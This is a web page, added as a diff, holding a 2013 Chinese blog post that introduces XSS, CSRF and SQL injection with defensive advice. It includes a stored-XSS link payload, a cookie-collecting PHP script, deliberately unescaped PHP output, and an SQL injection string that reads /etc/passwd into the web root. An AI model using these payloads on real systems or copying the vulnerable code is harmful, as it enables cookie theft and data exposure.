@@ -1,0 +1,793 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/vendors/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/vendors/font-awesome/css/font-awesome.min.css?v=4.4.0" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.0.1" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="计算机 比特币 互联网金融 IFWallet" />
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.0.1" />
+
+
+
+
+
+
+<meta name="description" content="理解web安全这几天接触了一下web安全，其中涉及到:  XSS攻击 —— cross site script CSRF攻击 —— cross site request forgery XSS+CSRF(蠕虫) SQL注入  首先要理解XSS和CSRF，因为这是两种利用web缺陷发起的基本攻击，但是其威力也不容小视。首先我们要认识到HTTP协议是无状态的，也即一次请求响应和下一次没有关系，或者说没">
+<meta name="keywords" content="bibodeng, blockchain, bitcoin, bitcoin cash, life, programmer">
+<meta property="og:type" content="article">
+<meta property="og:title" content="初探web中的XSS和CSRF攻击">
+<meta property="og:url" content="https://bibodeng.github.io/2013/10/05/初探web中的XSS和CSRF攻击/index.html">
+<meta property="og:site_name" content="bibodeng">
+<meta property="og:description" content="理解web安全这几天接触了一下web安全，其中涉及到:  XSS攻击 —— cross site script CSRF攻击 —— cross site request forgery XSS+CSRF(蠕虫) SQL注入  首先要理解XSS和CSRF，因为这是两种利用web缺陷发起的基本攻击，但是其威力也不容小视。首先我们要认识到HTTP协议是无状态的，也即一次请求响应和下一次没有关系，或者说没">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://www.bibodeng.com/content/plugins/kl_album/upload/201310/112db41ad44e2bbeb0dc695f3dd00fc92013100500193628335.png">
+<meta property="og:updated_time" content="2018-08-21T08:00:01.842Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="初探web中的XSS和CSRF攻击">
+<meta name="twitter:description" content="理解web安全这几天接触了一下web安全，其中涉及到:  XSS攻击 —— cross site script CSRF攻击 —— cross site request forgery XSS+CSRF(蠕虫) SQL注入  首先要理解XSS和CSRF，因为这是两种利用web缺陷发起的基本攻击，但是其威力也不容小视。首先我们要认识到HTTP协议是无状态的，也即一次请求响应和下一次没有关系，或者说没">
+<meta name="twitter:image" content="http://www.bibodeng.com/content/plugins/kl_album/upload/201310/112db41ad44e2bbeb0dc695f3dd00fc92013100500193628335.png">
+
+
+
+<script type="text/javascript" id="hexo.configuration">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    scheme: 'Mist',
+    sidebar: {"position":"right","display":"post"},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: 0,
+      author: '博主'
+    }
+  };
+</script>
+
+  <title> 初探web中的XSS和CSRF攻击 | bibodeng </title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container one-collumn sidebar-position-right page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-meta ">
+  
+
+  <div class="custom-logo-site-title">
+    <a href="/"  class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <span class="site-title">bibodeng</span>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+  <p class="site-subtitle">Think By My Mind</p>
+</div>
+
+<div class="site-nav-toggle">
+  <button>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+  </button>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                初探web中的XSS和CSRF攻击
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">发表于</span>
+            <time itemprop="dateCreated" datetime="2013-10-05T08:19:50+08:00" content="2013-10-05">
+              2013-10-05
+            </time>
+          </span>
+
+          
+
+          
+            
+          
+
+          
+	
+          
+          
+             <span id="/2013/10/05/初探web中的XSS和CSRF攻击/" class="leancloud_visitors" data-flag-title="初探web中的XSS和CSRF攻击">
+               &nbsp; | &nbsp;
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               <span class="post-meta-item-text">阅读次数 </span>
+               <span class="leancloud-visitors-count"></span>
+              </span>
+          
+
+          
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="理解web安全"><a href="#理解web安全" class="headerlink" title="理解web安全"></a>理解web安全</h1><p>这几天接触了一下web安全，其中涉及到:</p>
+<ul>
+<li>XSS攻击 —— cross site script</li>
+<li>CSRF攻击 —— cross site request forgery</li>
+<li>XSS+CSRF(蠕虫)</li>
+<li>SQL注入</li>
+</ul>
+<p>首先要理解XSS和CSRF，因为这是两种利用web缺陷发起的基本攻击，但是其威力也不容小视。首先我们要认识到HTTP协议是无状态的，也即一次请求响应和下一次没有关系，或者说没有状态之间的联系，而应用中必须保持着某种状态，例如在cookie中存一些数据。而web中的session其实是基于cookie的，只是记录的这个cookie是经过加密的一个sessionid，从而用来确认用户身份。曾经听说过网站中这次登录，如果用户选择了下次自动登录，则服务器将会记录一个sessionid,作为下次登陆的凭证，但是只使用一次，下次登录又申请新的，服务器每次发送请求，都带上了该网站的cookie，但是cookie是可以在客户端被修改的。cookie保存在浏览器中的确是很危险的，在后面的例子中我们就可以看到它是怎样被轻易拿走的。</p>
+<h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><p>XSS攻击分为两种：</p>
+<ul>
+<li>反射型</li>
+<li>存储型</li>
+</ul>
+<p>所谓反射型，就是点击了某个链接触发了某个漏洞，从而被利用发送相关信息到黑客服务器上，被窃取。另外一种是常见的评论或者是帖子，包含了一些恶意代码，但是被提交存储到了数据库中，这样每次其他用户访问该网页，也会受到侵扰，其中夹带很多恶意链接，用户点了之后或许会受到攻击。</p>
+<p>反射型，很常见的就是构造了一个带有恶意的链接，比如有如下表单：</p>
+<pre><code>&lt;body&gt;
+&lt;form action=&quot;php/index.php&quot; method=&quot;POST&quot;&gt;
+    &lt;input type=&quot;text&quot; name=&quot;user_name&quot;&gt;&lt;br&gt;
+    &lt;input type=&quot;password&quot; name=&quot;user_passwd&quot;&gt;&lt;br&gt;
+
+    &lt;textarea name=&quot;user_descr&quot; rows=5 cols=80&gt;&lt;/textarea&gt;&lt;br&gt;
+    &lt;input type=&quot;submit&quot; value=&quot;提交&quot;&gt;
+&lt;/form&gt;
+&lt;/body&gt;
+</code></pre><p>是提交评论或者是注册，里面提供了一些可以注入的地方，例如我们往textarea注入恶意代码，也就是看是否能够让服务器存储起来，渲染出来祸害别的用户。假设黑客填入了如下的信息：</p>
+<pre><code>&lt;a href=&quot;http://abc.com&quot;   onclick=&quot;window.location=&apos;http://localhost/hacker/index.php&apos;;&quot;&gt; hello  &lt;/a&gt;
+</code></pre><p>服务器端直接获取用户数据，予以存储，这里仅仅做一个模拟，直接把用户数据输出。相当于注入逃过了PHP的检查，从而成为存储型XSS。</p>
+<pre><code>$name = $_POST[&apos;user_name&apos;];
+$passwd = $_POST[&apos;user_passwd&apos;];
+$descr = $_POST[&apos;user_descr&apos;];
+
+print $name;
+print &apos; &apos;;
+print $passwd;
+
+
+print &apos;&lt;span&gt;&apos; . $descr . &apos;&lt;/span&gt;&apos;;
+</code></pre><p>黑客的服务器，用来获取用户的cookie</p>
+<pre><code>&lt;?php
+$cookie = $_GET[&apos;c&apos;];
+// 写到一个文件里面
+print_r($cookie);
+</code></pre><p>chrome浏览器会报错误，对于表单中的敏感字符串如script标签，js代码做了处理，所以提交不到服务端：</p>
+<p><img src="http://www.bibodeng.com/content/plugins/kl_album/upload/201310/112db41ad44e2bbeb0dc695f3dd00fc92013100500193628335.png" alt="XSS攻击警告"></p>
+<p>但是IE内核的搜狗浏览器却中招了，当点击该链接的时候，将发送该用户的cookie到hacker的服务器上，这样就达到了初步的攻击。nodeJS社区上有更加精彩的XSRF攻击，利用注入的代码，获取用户信息，并且假冒用户发出各种请求（服务器中处理各种请求的就是功能函数，直接用url可访问），导致alert满天飞，并且自动顶帖。其实所有允许嵌入html标签的地方，都是相当危险的。</p>
+<p>对于存储型的攻击，服务器端应该对用户的输入中敏感字符进行转义。严格来讲，不能信赖我们发送出去的客户端，更加不能信赖用户的输入。</p>
+<p>上面例子中google浏览器对于提交的数据中带有脚本拒不运行，但是在搜狗兼容模式下，居然注入成功了，黑客提交的数据假设已经存储起来了，未加任何的处理直接在模板中直接输出，而用户点击了之后，会触发事件，从而向恶意服务器发送用户的cookie信息。发送的方式有很多种，例如图片src请求，location.href直接跳转，以及某些事件触发脚本运行，例如onclick。</p>
+<p>防范的方法：</p>
+<ol>
+<li>替换或过滤<code>&lt;script&gt;</code>等标签</li>
+<li>输出html标签时进行转义，防止恶意代码运行（大部分博客的评论都采用此法）。</li>
+</ol>
+<h3 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h3><p>跨站请求伪造，就是说恶意网站窃取用户的身份及权限，到某个正常网站上进行操作。例如自动发微博，加关注，转帐，消费等，对用户数据及财产带来危害。</p>
+<p>由于web的客户端一般是公开的，而服务端的处理地址已知，这样就可以模拟用户的请求，向服务端发送请求。例如当用户在浏览某正常网站A的时候，并登陆，在浏览器端记录了cookie等数据，这时候点开了一个恶意网站B,B向A网站发起了某个请求，例如加关注，其中因为同一个浏览器下，各个进程之间甚至可以共享cookie等数据，也可以是XSS注入中提供的cookie等数据，这样就可以骗过A网站搞破坏了。</p>
+<p>其实服务器端从将客户端代码发送到客户之后，就不应该信任客户端了，因为它可能被篡改，或者被模拟。故而需要一个机制确认这就是我自己发出去的客户端，而不是伪造的。常见的方法就是：</p>
+<ul>
+<li>验证码 将验证码记录在session中，由服务器生成，生成图片发送到客户端，验证一致则认定安全</li>
+<li>在表单中设置一个hidden项 服务器生成随机数，发送到客户端，提交表单时候一起提交到服务器验证</li>
+</ul>
+<p>但是如果用户受到了XSS攻击，那么是有办法将这个验证码弄到手并发送到黑客服务器脚本的，这样相当于有个间谍在内部，拿到了电报密码，代号什么的都不管用了。其实不管什么办法，这都不安全，除非进行认证（密码学），确实不可伪造。</p>
+<h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><p>对于SQL注入，就是说黑客预料到可能会执行某个sql操作，于是提交含有恶意代码的输入。例如：</p>
+<pre><code>$query = “SELECT * FROM v_movie WHERE movieid=$movieid” ;
+// 而movieid用户输入的是
+$movieid = “1 UNION select load_file(‘/etc/passwd’) into outfile ‘&lt;webroot&gt;/passwd.txt’”;
+</code></pre><p>那么将会把密码都输出到服务器某个文本文件上，黑客可以直接按url访问，这相当恐怖。所以对于所有要放到数据库中的数据，在PHP中都要进行严格的数据检查，对于敏感的如单引号，双引号等应该予以转义。我们开发中常用的就是自己写一个addSlash。coolshell的博客中还提及了利用摄像头摄入车牌号进行注入，可谓是无所不能。</p>
+<p>对sql注入主要的防范方法有：</p>
+<ol>
+<li>严格检查参数类型</li>
+<li>使用正则表达式来过滤数据</li>
+<li>严格限制执行权限（刚刚好够用的权限，而不是root）</li>
+<li>注意日志，追踪攻击</li>
+</ol>
+<p>参考链接：</p>
+<p><a href="http://stackoverflow.com/questions/129677/whats-the-best-method-for-sanitizing-user-input-with-php/130323#130323" target="_blank" rel="noopener">stack overflow</a></p>
+<p><a href="http://coolshell.cn/articles/4914.html" target="_blank" rel="noopener">coolshell微博蠕虫分析</a></p>
+<p><a href="http://snoopyxdy.blog.163.com/blog/static/60117440201281294147873/" target="_blank" rel="noopener">nodejs注入实例</a></p>
+<p>by bibodeng 2013-10-05</p>
+
+      
+    </div>
+
+    <div>
+      
+        
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2013/09/16/【读书】 javascript  the good part 读书笔记/" rel="next" title="【读书】 javascript  the good part 读书笔记">
+                <i class="fa fa-chevron-left"></i> 【读书】 javascript  the good part 读书笔记
+              </a>
+            
+          </div>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2013/10/10/理解JSONP原理与使用/" rel="prev" title="理解JSONP原理与使用">
+                理解JSONP原理与使用 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel ">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/images/bitcoin-cash-logo.svg"
+               alt="bibodeng" />
+          <p class="site-author-name" itemprop="name">bibodeng</p>
+          <p class="site-description motion-element" itemprop="description">区块链爱好者，互联网从业者</p>
+        </div>
+        <nav class="site-state motion-element">
+          <div class="site-state-item site-state-posts">
+            <a href="/archives">
+              <span class="site-state-item-count">180</span>
+              <span class="site-state-item-name">日志</span>
+            </a>
+          </div>
+
+          
+
+          
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/bibodeng" target="_blank" title="Github">
+                  
+                    <i class="fa fa-fw fa-globe"></i>
+                  
+                  Github
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="https://twitter.com/bibodeng" target="_blank" title="Twitter">
+                  
+                    <i class="fa fa-fw fa-twitter"></i>
+                  
+                  Twitter
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://weibo.com/bibodeng" target="_blank" title="Weibo">
+                  
+                    <i class="fa fa-fw fa-weibo"></i>
+                  
+                  Weibo
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+
+        
+        
+          <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+            <div class="links-of-blogroll-title">
+              <i class="fa  fa-fw fa-globe"></i>
+              Links
+            </div>
+            <ul class="links-of-blogroll-list">
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://ifwallet.com" title="IFWallet" target="_blank">IFWallet</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://ifpass.cash" title="IFPassword" target="_blank">IFPassword</a>
+                </li>
+              
+            </ul>
+          </div>
+        
+
+      </section>
+
+      
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+            
+              
+            
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#理解web安全"><span class="nav-number">1.</span> <span class="nav-text">理解web安全</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#XSS"><span class="nav-number">1.0.1.</span> <span class="nav-text">XSS</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CSRF"><span class="nav-number">1.0.2.</span> <span class="nav-text">CSRF</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SQL注入"><span class="nav-number">1.0.3.</span> <span class="nav-text">SQL注入</span></a></li></ol></li></ol></li></ol></div>
+            
+          </div>
+        </section>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">bibodeng</span>
+</div>
+
+<div class="powered-by">
+  由 <a class="theme-link" href="http://hexo.io">Hexo</a> 强力驱动
+</div>
+
+<div class="theme-info">
+  主题 -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Mist
+  </a>
+</div>
+
+        
+
+        
+      </div>
+    </footer>
+
+    <div class="back-to-top">
+      <i class="fa fa-arrow-up"></i>
+    </div>
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+  
+  <script type="text/javascript" src="/vendors/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/vendors/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/vendors/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/vendors/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/vendors/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/vendors/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.0.1"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.0.1"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.0.1"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.0.1"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.0.1"></script>
+
+
+
+  
+
+
+
+  
+
+
+
+  
+  
+  
+
+  
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.1.js"></script>
+  <script>AV.initialize("RrMSWOa8nuCnCCWn8TyPa7Od-gzGzoHsz", "8xnzit83sqv6vUEuXlsEWe0s");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            counter.save(null, {
+              success: function(counter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.get('time'));
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            var newcounter = new Counter();
+            /* Set ACL */
+            var acl = new AV.ACL();
+            acl.setPublicReadAccess(true);
+            acl.setPublicWriteAccess(true);
+            newcounter.setACL(acl);
+            /* End Set ACL */
+            newcounter.set("title", title);
+            newcounter.set("url", url);
+            newcounter.set("time", 1);
+            newcounter.save(null, {
+              success: function(newcounter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+              },
+              error: function(newcounter, error) {
+                console.log('Failed to create');
+              }
+            });
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+  
+
+</body>
+</html>
